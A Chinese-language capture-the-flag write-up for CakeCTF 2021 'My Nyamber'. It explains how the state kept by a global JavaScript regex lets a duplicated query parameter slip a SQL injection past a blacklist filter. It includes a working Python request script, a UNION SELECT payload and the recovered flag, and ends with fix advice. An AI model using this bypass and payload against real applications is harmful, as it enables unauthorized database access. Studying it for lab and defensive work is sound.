# CakeCTF2021 My Nyamber

## 题目简述

Node.js 接口把名字直接拼进 SQLite 查询，但先用正则 `/('|\\|\s)/g` 拦截单引号、反斜杠和空白。问题是正则带有全局标志 `g`，同一个 `RegExp` 对象在循环中反复调用 `exec` 时会保存 `lastIndex`。通过两个同名参数组成数组，可以让第一次匹配把游标推到第二个 payload 末尾之外，使第二次检查错误地返回 `null`。

## 解题过程

### 利用全局正则的状态

多次提交 `name` 查询参数时，Express 将其解析为数组，程序进入：

```js
for (let name of neko_name) {
    if (filter.exec(name.toString()) === null) {
        // 拼接 SQL
    }
}
```

第一个元素使用 256 个 `A` 加单引号。正则在索引 256 命中，`lastIndex` 被设为 257；因为命中了危险字符，这个元素本身不会进入 SQL。

第二个元素使用较短的 SQL 注入串。`exec` 从索引 257 开始搜索，起点已超过字符串长度，所以本次返回 `null`。JavaScript 随后会把全局正则的 `lastIndex` 重置为 0，但当前 `if` 已经把 payload 当成安全输入。

### 用 UNION 读取 flag 表

请求中发送两个 `name` 参数：

```python
import requests

params = [
    ("name", "A" * 256 + "'"),
    ("name", "' UNION SELECT 1,flag,3,4 FROM flag;")
]
r = requests.get("http://target/api/neko", params=params)
print(r.json())
```

第二个值被拼成：

```sql
SELECT * FROM neko WHERE name=''
UNION SELECT 1,flag,3,4 FROM flag;'
```

SQLite 接受分号前的语句并返回与 `neko` 表四列结构相容的行，flag 出现在名字字段：

```text
CakeCTF{BUG-REPORT-ACCEPTED:Reward=222-Matatabi-Sticks}
```

首个填充长度不应机械照搬到其他运行时；只要让第一次命中后的 `lastIndex` 大于第二个字符串长度即可。

## 方法总结

- JavaScript 的全局或 sticky 正则是有状态对象，循环复用 `exec` 前必须显式重置 `lastIndex`。
- 黑名单过滤即使覆盖了明显元字符，也可能因输入类型从字符串变为数组而走入未预期的状态路径。
- 根本修复是参数化 SQL；修正正则状态只能消除这一条绕过，不能让字符串拼接变安全。
